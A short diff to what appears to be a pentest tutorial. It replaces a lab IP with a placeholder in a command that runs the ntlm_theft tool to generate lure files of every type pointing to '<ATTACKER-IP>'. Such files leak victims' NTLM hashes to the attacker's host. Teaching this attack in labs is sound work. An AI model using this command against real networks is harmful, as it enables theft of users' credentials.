@@ -154,7 +154,7 @@ pip3 install xlsxwriter
 
 ```bash
 cd ntlm_theft
-python3 ntlm_theft.py -g all -s 10.11.69.221 -f test
+python3 ntlm_theft.py -g all -s <ATTACKER-IP> -f test
 
 
 # -g: generate. Here, we specify the file types (for related attacks) to generate
